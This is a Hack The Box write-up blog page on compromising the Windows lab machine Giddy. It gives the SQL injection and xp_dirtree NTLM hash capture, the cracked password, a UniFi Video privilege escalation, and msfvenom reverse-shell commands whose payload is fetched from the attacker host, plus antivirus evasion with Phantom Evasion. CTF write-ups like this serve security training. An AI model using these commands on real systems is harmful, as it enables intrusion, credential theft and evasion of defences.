<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Giddy - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Giddy"><a href="#Hack-The-Box-Giddy" class="headerlink" title="Hack The Box - Giddy"></a>Hack The Box - Giddy</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Giddy retired and this is my write-up. Giddy was a nice windows box , This box had a nice sqli vulnerability which we will use to steal ntlm hashes and login , Then the privilege escalation was a Local Privilege Escalation vulnerability in a software called Ubiquiti UniFi Video which also was a cool vulnerability , I had fun doing this box as it was a challenging one. It’s a windows box and its ip is 10.10.10.104 , I added it to <code>/etc/hosts</code> as <code>giddy.htb</code>. Let’s jump right in.<br><img src="/images/hackthebox/giddy/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC giddy.htb</code><br><img src="/images/hackthebox/giddy/1.png" alt=""><br>nmap tells us that port 80 and 443 are open and running http , port 3389 is also open and it says “Microsoft Terminal Services”, Let’s check http</p>
<h2 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h2><p>On http (port 80) there’s only this picture :<br><img src="/images/hackthebox/giddy/2.png" alt=""><br>Also the same picture on https (port 443)<br><img src="/images/hackthebox/giddy/3.png" alt=""><br>Let’s run gobuster with <code>directory-list-2.3-medium.txt</code> and see what we will get<br><code>gobuster -u http://giddy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -to 250s</code><br>Results :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)                                                                                       </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;                                                                                       </span><br><span class="line">[+] Mode         : dir                                                                                                                      </span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;giddy.htb&#x2F;                                                                                                        </span><br><span class="line">[+] Threads      : 100                                                                                                                      </span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt                                                             </span><br><span class="line">[+] Status codes : 200,204,301,302,307,403                                                                                                  </span><br><span class="line">[+] Timeout      : 4m10s                                                                                                                    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;                                                                                       </span><br><span class="line">2019&#x2F;02&#x2F;15 21:36:09 Starting gobuster                                                                                                       </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;remote (Status: 302)</span><br><span class="line">&#x2F;mvc (Status: 301)</span><br></pre></td></tr></table></figure>
<p>We got 2 sub directories <code>/remote</code> and <code>/mvc</code><br>Let’s take a look at <code>/remote</code> :<br><img src="/images/hackthebox/giddy/4.png" alt=""><br>It redirects us to this page titled as <code>Windows PowerShell Web Access</code> , we don’t have any credentials so we can ignore this for now and check <code>/mvc</code><br><img src="/images/hackthebox/giddy/5.png" alt=""><br>And we get this <code>ASP.NET</code> application</p>
<h2 id="SQLI-and-getting-User"><a href="#SQLI-and-getting-User" class="headerlink" title="SQLI and getting User"></a>SQLI and getting User</h2><p>After some regular enumeration we will find that when we click on a product name we get something like this :<br><img src="/images/hackthebox/giddy/6.png" alt=""><br>The url has a parameter called <code>ProductSubCategoryId</code> , and if we try a single quote <code>&#39;</code> :<br><img src="/images/hackthebox/giddy/7.png" alt=""><br>We get an error saying “Unclosed quotation mark after the character string” so this parameter is sql injectable , let’s try something like <code>1; UPDATE Product SET Name= &#39;&#39;</code><br><img src="/images/hackthebox/giddy/8.png" alt=""><br>And we see that it dumped the products, we can run responder and use <code>xpdirtree</code> to make it try to connect to us , you can read about <code>xpdirtree</code> <a href="http://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html" target="_blank" rel="noopener">here</a><br>To do this let’s run responder first <code>responder -I tun0</code><br>Then let’s use <code>xpdirtree</code> : <code>1; EXEC MASTER.sys.xp_dirtree &#39;\\10.10.xx.xx\fakeshare&#39;</code><br><img src="/images/hackthebox/giddy/9.png" alt=""><br>What is this doing is simply running a fake smb server with responder that steals ntlm hashes , then by using <code>xpdirtree</code> we make the server try to connect to our fake smb server. Let’s check responder now :<br><img src="/images/hackthebox/giddy/10.png" alt=""><br>We captured ntlm hash for a user called <code>Stacy</code> , Let’s crack the hash with john<br><img src="/images/hackthebox/giddy/11.png" alt=""><br>And the password is <code>xNnWo6272k7x</code> , let’s use the PowerShell Web Access<br><img src="/images/hackthebox/giddy/12.png" alt=""><br>We get this web interface for powershell :<br><img src="/images/hackthebox/giddy/13.png" alt=""><br>We can get the user flag now :<br><img src="/images/hackthebox/giddy/14.png" alt=""><br>And we owned user !</p>
<h2 id="unifivideo-local-privilege-escalation"><a href="#unifivideo-local-privilege-escalation" class="headerlink" title="unifivideo local privilege escalation"></a>unifivideo local privilege escalation</h2><p>If we return to <code>Documents</code> again we will find a file called <code>unifivideo</code><br><img src="/images/hackthebox/giddy/15.png" alt=""></p>
<blockquote>
<p>UniFi Video is a powerful and flexible, integrated IP video management surveillance system designed to work with Ubiquiti’s UniFi Video Camera product line. UniFi Video has an intuitive, configurable, and feature‑packed user interface with advanced features such as motion detection, auto‑discovery, user-level security, storage management, reporting, and mobile device support.</p>
</blockquote>
<p>A quick google search and we will find that an old version of unifivideo had a local privilege escalation vulnerability , check it <a href="https://www.exploit-db.com/exploits/43390" target="_blank" rel="noopener">here</a><br>What’s happening is , Upon the start of the service “Ubiquiti UniFi Video” it tries to execute a file called <code>taskkill.exe</code> in <code>C:\ProgramData\unifi-video\</code> but that file doesn’t exist by default , if we have write permissions to that directory we can place our payload there as <code>taskkill.exe</code> then restart the service. And because the service runs with privileged permissions , it will be excuted as administrator.<br>Let’s first create a payload with msfvenom :<br><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -f exe &gt; taskkill.exe</code><br><img src="/images/hackthebox/giddy/16.png" alt=""><br>We will set up the handler on metasploit :<br><code>use multi/handler</code></p>
<p><code>set payload windows/meterpreter_reverse_tcp</code></p>
<p><code>set LHOST 10.10.xx.xx</code></p>
<p><code>set LPORT 1337</code><br>Then we will run a simple http server with python to host the payload<br><code>python -m SimpleHTTPServer 80</code><br>After that we will download the file , since we are on powershell we can do this :<br><code>Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe</code><br>Then we will stop the service :<br><code>Stop-Service &quot;Ubiquiti UniFi Video&quot;</code><br><img src="/images/hackthebox/giddy/17.png" alt=""><br>Start it again :<br><code>Start-Service &quot;Ubiquiti UniFi Video&quot;</code><br><img src="/images/hackthebox/giddy/18.png" alt=""><br>Let’s check our listener<br><img src="/images/hackthebox/giddy/19.png" alt=""><br>We didn’t get a meterpreter session !</p>
<h2 id="Evading-anti-virus-and-getting-root"><a href="#Evading-anti-virus-and-getting-root" class="headerlink" title="Evading anti-virus and getting root"></a>Evading anti-virus and getting root</h2><p>We didn’t get a meterpreter session because there’s some kind of anti-virus blocking our payload , so what i’m going to do is to use a framework called <code>phantom evasion</code> , you can get it from <a href="https://github.com/oddcod3/Phantom-Evasion" target="_blank" rel="noopener">github</a><br><img src="/images/hackthebox/giddy/20.png" alt=""><br>We will use [1] windows modules , then [1] shellcode injection , [4] windows shellcode injection heapalloc , after that it will ask for the payload :<br><img src="/images/hackthebox/giddy/21.png" alt=""><br>We will choose Msfvenom<br>And for encoding we will choose [4] x86/xor_dynamic + Triple Multibyte-key xor:<br><img src="/images/hackthebox/giddy/22.png" alt=""><br>It will ask for adding multi processes behaviour , stripping and signing the executable , we will say no to all of them , then finally we will have our payload.<br>We will repeat what we did with the other payload again , and let’s check our listener :<br><img src="/images/hackthebox/giddy/23.png" alt=""><br>We got a meterpreter session and owned root !</p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/ypuffy/">Hack The Box - Ypuffy</a><br>Next Hack The Box write-up : <a href="/hack-the-box/zipper/">Hack The Box - Zipper</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-02-16</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/active-directory/" rel="tag">#active-directory</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqli</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a> <a class="tag-link" href="/tags/windows/" rel="tag">#windows</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
